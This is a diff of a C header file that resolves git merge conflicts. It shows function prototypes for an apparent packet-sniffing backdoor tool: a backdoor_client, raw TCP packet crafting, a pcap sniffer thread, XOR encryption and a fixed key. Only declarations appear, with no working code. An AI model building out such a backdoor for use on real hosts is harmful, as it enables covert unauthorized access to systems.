@@ -29,12 +29,10 @@
 #include <pthread.h>
 #include <strings.h>
 
-<<<<<<< HEAD
-typedef uint32_t uint32;
-=======
+//typedef u_int32_t uint32;
+
 #include "defs.h"
 
->>>>>>> a5b4cdb85c7bd3d9bf51dee8cb922a0f02a6c340
 
 // Globals
 char key = 'A';
@@ -70,23 +68,17 @@ static struct _pseudo_header {
 	struct tcphdr tcp;
 } pseudo_header;
 
-<<<<<<< HEAD
 
-=======
-void *backdoor_client(uint32 ipaddress, int protocol)
-char *xor_encrypt(char *data);
-char *xor_decrypt(char *data);
-void print_usage(char *argv[]);
->>>>>>> a5b4cdb85c7bd3d9bf51dee8cb922a0f02a6c340
 client *client_new(void);
-void packet_new(client *, char *);
-void SystemFatal(char *c);
-unsigned short in_cksum(unsigned short *, int);
-void send_packets(client *, char *);
-void *sniffer_thread(void *);
-pcap_t *open_pcap_socket(char *, const char *);
-void parse_packet(u_char *, struct pcap_pkthdr *, u_char *);
-void backdoor_client(char*, char*);
+void packet_new(client *c, char *msg);
+unsigned short in_cksum(unsigned short *addr, int len);
+void send_packets(client *c, char *input);
+void SystemFatal(char *msg);
+void *sniffer_thread(void *args);
+pcap_t * open_pcap_socket(char *device, const char *filter);
+void parse_packet(u_char *user, struct pcap_pkthdr *packethdr, u_char *packet);
+void backdoor_client(uint32 ipaddress, char* protocol);
+unsigned int host_convert(char *hostname);
 
 #endif /* COMMON_H_ */
 
